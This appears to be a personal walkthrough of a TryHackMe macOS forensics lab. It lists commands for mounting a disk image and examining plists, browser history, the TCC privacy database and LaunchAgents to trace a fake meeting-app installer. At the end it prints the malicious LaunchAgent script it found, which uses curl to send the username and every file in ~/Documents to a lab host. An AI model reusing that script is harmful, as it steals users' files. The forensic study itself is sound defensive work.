### Mac hunt - https://tryhackme.com/room/machunt

```bash
sudo apfs-fuse -v 4 /home/ubuntu/Jack_Mac.img /home/ubuntu/mac
sudo su
cd /home/ubuntu/mac

# most of the user forensic data is present in ~/Library/Preferences/ directory
cd root/Users/jake/Library/Preferences/
# finding nav folders
plistutil -p com.apple.finder.plist | less # can use grep as well
# somewhere in FXRecentFolders

# attempted to read user's browsing history @chrome, safari!
cd .../Library/Safari/
sqlitebrowser History.db
# checked the `history_visits` table for URLs => LinkedIn

# attempt to check the download files
plistutil -p Downloads.plist | less
# found a download link to a pkg file => http://files.techthm.careers.thm:8080/MeetMeLiveInstaller.pkg
# => a file with instructions at https://www.linkedin.com/dms/prv/vid/v2/D4D06AQGm4JKZe0_YOg/messaging-attachmentFile/B4DZaFtOpBH4AI-/0/1745999948823?m=AQLwEV_pZVeJggAAAZaF4f1sF3cQqoqdWb6NBttKAHbEUTE25fLpzLG5LiE&ne=1&v=beta&t=SBiD-QsKelAXCBMiHy1dRdm001vHvuqqkKADE9dBV10
mate-open ../../Downloads/<some-pdf_file>.pdf

# some hotspot connection is suggested in this file @ root/Library/Preferences/com.apple.wifi.known-networks.plist
plistutil -p com.apple.wifi.known-networks.plist

# rw dump here of history
cat ../../../../private/var/db/dhcpclient/en0.plist
cat ../../../../private/var/db/dhcpclient/leases/en0.plist 
pwd ../../../
cd ../../..
ls
cd jake/
ls
ls ../Shared/.
ls ../../
cat ../../Applications/MeetMeLive.app/Contents/Info.plist 
ls ../ -al
cd ../.. -al
ls ../.. -al
ls
cat ../../Library/Receipts/InstallHistory.plist 
history | tail -40

# checked escalation of privilege methods and files where data is stored
# found `Library/Application Support/com.apple.TCC/TCC.db` => privacy database
sqlite3 Library/Application\ Support/com.apple.TCC/TCC.db
sqlite> .tables
# lots
sqlite> select * from access;
# found MeetMeLive has access to kTCCServiceSystemPolicyAllFiles a.k.a Full Disk Access
.exit

# checked possible launch on startup mechanisms on MacOS => `launchd`/`cron`/`at` - nothing, `LaunchAgents`/`LaunchDaemons` - used #1
cd ../../Library/LaunchAgents/
ls -al
# found MeetMeLive.sh and com.meetmelive.plist


# checked MeetMeLive.sh within ~/Library/LaunchAgents/MeetMeLive.sh
cat Library/LaunchAgents/MeetMeLive.sh
#!/bin/bash

curl -s -X POST http://techthm.thm/exfil -d "user=$(whoami)&time=$(date)"
find ~/Documents -type f | while read file; do
    curl -s -X POST http://techthm.thm/exfil -F "file=@$file"
done
exit 0
Library/LaunchAgents/MeetMeLive.sh (END)

# found exfiltration script to http://techthm.thm/exfil

### FIN
```